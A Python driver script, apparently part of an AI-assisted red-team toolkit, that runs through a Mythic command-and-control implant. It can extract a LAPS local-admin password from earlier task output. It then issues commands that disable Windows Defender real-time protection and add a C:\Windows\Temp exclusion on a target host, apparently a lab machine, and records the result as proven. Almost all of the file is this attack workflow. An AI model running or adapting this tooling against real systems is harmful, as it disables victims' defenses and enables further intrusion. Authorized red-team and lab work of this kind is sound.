#!/usr/bin/env python3
"""Bounded live proof for endpoint protection status/adjustment.

No LLM is used. The script builds Sage's generic
`endpoint-protection-adjustment` capability into Mythic commands, executes them
from a selected callback, and records `endpoint-protection-adjusted:<host>@<domain>`
only when the post-change probe proves the requested adjustment or inactive state.
"""

from __future__ import annotations

import argparse
import ast
import asyncio
import base64
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))

import capabilities  # noqa: E402
import engagement_ledger  # noqa: E402
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"

SECRET_ATTR_RE = re.compile(r"(?im)^(\s*ms(?:-mcs-admpwd|laps-password)\s*[:=]\s*)(.+?)\s*$")


def _display_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="replace")
    text = str(value)
    stripped = text.strip()
    if len(stripped) >= 3 and stripped[0] in "bB" and stripped[1] in {"'", '"'}:
        try:
            literal = ast.literal_eval(stripped)
            if isinstance(literal, bytes):
                text = literal.decode(errors="replace")
            elif isinstance(literal, str):
                text = literal
        except Exception:
            pass
    return text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")


def _extract_managed_secret(value: Any) -> str:
    text = _display_text(value)
    for match in SECRET_ATTR_RE.finditer(text):
        secret = match.group(2).strip().strip("'\"")
        if secret and secret.casefold() not in {"null", "none", "not set", "no_result", "<redacted>", "redacted"}:
            return secret
    return ""


def _collect_secrets(value: Any) -> list[str]:
    out: list[str] = []
    if isinstance(value, dict):
        for key, item in value.items():
            if str(key).casefold() in {"password", "secret", "credential", "credential_text"} and isinstance(item, str):
                if item:
                    out.append(item)
            else:
                out.extend(_collect_secrets(item))
    elif isinstance(value, list):
        for item in value:
            out.extend(_collect_secrets(item))
    return out


def _redact(value: Any, secrets: tuple[str, ...] = ()) -> Any:
    if isinstance(value, dict):
        out = {}
        for key, item in value.items():
            if str(key).casefold() in {"password", "secret", "credential", "credential_text"} and not isinstance(item, dict):
                out[key] = "<redacted>"
            else:
                out[key] = _redact(item, secrets)
        return out
    if isinstance(value, list):
        return [_redact(item, secrets) for item in value]
    if isinstance(value, str):
        text = _display_text(value)
        for secret in secrets:
            if secret:
                text = text.replace(secret, "<redacted>")
        return SECRET_ATTR_RE.sub(r"\1<redacted>", text)
    return value


def _tail(value: Any, secrets: tuple[str, ...], limit: int = 2200) -> str:
    return str(_redact(str(value or ""), secrets))[-limit:]


def _command_summary(command: dict[str, Any], secrets: tuple[str, ...]) -> str:
    return json.dumps(_redact({
        "command": command.get("command"),
        "capability": command.get("capability"),
        "purpose": command.get("purpose"),
        "expected_probe": command.get("expected_probe"),
        "produces": command.get("produces"),
        "parameters": command.get("parameters"),
    }, secrets), sort_keys=True)


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


async def _task_output(client: Any, task_display_id: int) -> str:
    rows = await mythic.get_all_task_output_by_id(mythic=client, task_display_id=task_display_id)
    chunks = []
    for row in rows or []:
        raw = row.get("response_text") or ""
        if raw:
            try:
                chunks.append(base64.b64decode(raw).decode("utf-8", "replace"))
                continue
            except Exception:
                pass
        chunks.append(str(row.get("response") or raw or ""))
    return "\n".join(part for part in chunks if part)


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "14")))
    parser.add_argument("--target-host", default=os.environ.get("EP_TARGET_HOST", "braavos"))
    parser.add_argument("--target-domain", default=os.environ.get("EP_TARGET_DOMAIN", "essos.local"))
    parser.add_argument("--local-account", default=os.environ.get("LOCAL_ADMIN_ACCOUNT", "Administrator"))
    parser.add_argument("--password", default=os.environ.get("LOCAL_ADMIN_PASSWORD", ""))
    parser.add_argument("--secret-task", type=int, default=int(os.environ.get("LOCAL_ADMIN_SECRET_TASK", "0") or "0"))
    parser.add_argument("--method", default=os.environ.get("EP_METHOD", "remote-wmi"))
    parser.add_argument("--command", default=os.environ.get("EP_COMMAND", ""))
    parser.add_argument("--exclusion-path", action="append", default=None)
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    payload_type = _callback_payload_type(callback).casefold()
    print(
        f"target callback: cb{args.callback} payload={payload_type} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )

    password = args.password
    if not password and args.secret_task:
        secret_output = await _task_output(client, args.secret_task)
        password = _extract_managed_secret(secret_output)
        if password:
            print(f"loaded managed local admin secret from task {args.secret_task}: <redacted>")
        else:
            print(f"ERROR: task {args.secret_task} did not contain a plaintext managed local admin secret")
            return 1
    secrets = tuple(value for value in (password,) if value)

    tools = mythic_tools.MythicTools(agent_task_id="focused-endpoint-protection")
    tools.client = client
    await tools._ensure_engagement_key()
    engagement_key = tools._eng_key()
    original_objective = str(engagement_ledger.load(engagement_key).get("objective") or "")
    print(f"engagement: {engagement_key}")

    target_host = args.target_host.casefold()
    target_domain = args.target_domain.casefold()
    action = capabilities.CapabilityAction(
        name="endpoint-protection-adjustment",
        target=f"target={target_host};target_domain={target_domain};callback={args.callback}",
        preconditions=[
            f"remote-exec:{target_host}@{target_domain}",
            f"local-admin:{target_host}@{target_domain}",
            f"live-callback:{args.callback}",
        ],
        effects=[f"endpoint-protection-adjusted:{target_host}@{target_domain}"],
        intent={
            "capability": "endpoint-protection-adjustment",
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": str(args.callback),
            "local_account": args.local_account,
            "provider": "windows-defender",
        },
    )
    inputs: dict[str, Any] = {
        "method": args.method,
        "local_account": args.local_account,
        "actions": ["disable_realtime", "add_exclusion"],
        "exclusion_paths": args.exclusion_path or [r"C:\Windows\Temp"],
    }
    if password:
        inputs["password"] = password
    if args.command:
        inputs["endpoint_control_command"] = args.command
    elif payload_type == "apollo":
        inputs["endpoint_control_command"] = "powerpick"
    elif payload_type == "merlin":
        inputs["endpoint_control_command"] = "run"

    raw_plan = await tools.build_capability_commands(action, inputs)
    plan = json.loads(raw_plan)
    secrets = tuple(dict.fromkeys([*secrets, *_collect_secrets(plan)]))
    print(f"builder ok={plan.get('ok')} reason={plan.get('reason')}")
    if not plan.get("ok"):
        print(json.dumps(_redact(plan, secrets), indent=2, sort_keys=True))
        return 1

    execution_plan = plan.get("execution_plan") if isinstance(plan.get("execution_plan"), dict) else {}
    proof_marker = ""
    for step in execution_plan.get("steps") or []:
        params = step.get("parameters") if isinstance(step, dict) else {}
        if isinstance(params, dict) and params.get("proof_marker"):
            proof_marker = str(params.get("proof_marker"))
            break

    proof_output = ""
    proof_task_id = None
    for command in plan.get("commands") or []:
        if not isinstance(command, dict):
            continue
        print(f"\nissuing {_command_summary(command, secrets)}")
        output = await tools.issue_task_and_waitfor_task_output(
            str(command.get("command") or ""),
            command.get("parameters"),
            args.callback,
            timeout=args.timeout,
        )
        task_id = tools._last_issued_task_display_id
        print(f"task_id={task_id} expected_probe={command.get('expected_probe')}")
        print(f"output_tail:\n{_tail(output, secrets)}")
        if command.get("expected_probe") == "extract_endpoint_protection_probe":
            proof_task_id = task_id
        proof_output = "\n".join(part for part in (proof_output, _display_text(output)) if part)

    probe = capabilities.extract_endpoint_protection_probe(
        proof_output,
        target_host,
        target_domain,
        proof_marker,
    )
    probe["callback_id"] = str(args.callback)
    verification = capabilities.verify_capability("endpoint-protection-adjustment", probe)
    print(f"endpoint_protection_verdict={verification.verdict} reason={verification.reason}")
    print(json.dumps(_redact(probe, secrets), indent=2, sort_keys=True))

    if verification.verdict != "achieved":
        print("RESULT: endpoint protection adjustment was not proven in this bounded run")
        return 2

    recorded = tools.record_capability_result(
        action,
        probe,
        evidence={
            "source": "focused_endpoint_protection",
            "provenance": "run",
            "mythic_task_id": proof_task_id,
            "callback_id": args.callback,
            "target_host": target_host,
            "target_domain": target_domain,
        },
    )
    if original_objective:
        data = engagement_ledger.load(engagement_key)
        data["objective"] = original_objective
        engagement_ledger.save(data, engagement_key)
    print(f"record verdict={recorded.verdict} reason={recorded.reason}")
    print(f"RESULT: achieved endpoint-protection-adjusted:{target_host}@{target_domain}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
